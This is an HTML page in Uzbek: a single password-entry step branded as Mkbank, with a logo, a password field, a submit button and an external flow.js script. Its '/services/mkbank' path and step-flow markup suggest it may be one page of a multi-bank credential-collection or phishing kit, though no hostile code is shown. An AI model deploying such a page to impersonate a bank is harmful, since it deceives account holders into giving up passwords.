<!DOCTYPE html>
<html lang="uz">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Mkbank Password</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;700;800&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="./styles.css" />
  </head>
  <body data-screen="flow" data-step="password">
    <main class="page">
      <section class="step-card">
        <a class="back-link" href="/services/mkbank" aria-label="Ortga qaytish">&#8592;</a>

        <div class="logo-wrap step-logo" aria-label="Mkbank logo">
          <img class="logo-image" src="./img/logo.svg" alt="Mkbank logo" />
        </div>

        <header class="hero-copy step-copy">
          <h1>Parol</h1>
        </header>

        <form class="step-form" id="stepForm">
          <div class="phone-field password-row">
            <input
              id="stepValue"
              name="value"
              type="password"
              autocomplete="current-password"
              placeholder="Parol"
              required
            />
            <button class="field-action" type="button" id="togglePassword" aria-label="Parolni ko'rsatish">
              <svg viewBox="0 0 24 24" aria-hidden="true">
                <path
                  d="M12 5C6.5 5 2.1 8.4 1 12c1.1 3.6 5.5 7 11 7s9.9-3.4 11-7c-1.1-3.6-5.5-7-11-7zm0 11.2A4.2 4.2 0 1 1 12 7.8a4.2 4.2 0 0 1 0 8.4zm0-6.6a2.4 2.4 0 1 0 0 4.8 2.4 2.4 0 0 0 0-4.8z"
                />
              </svg>
            </button>
          </div>
          <p class="field-error" id="fieldError"></p>

          <button class="submit-btn is-inactive" type="submit" id="submitStepButton" disabled>Davom etish</button>
          <p class="status" id="statusMessage" aria-live="polite"></p>
        </form>
      </section>
    </main>

    <script src="./flow.js"></script>
  </body>
</html>
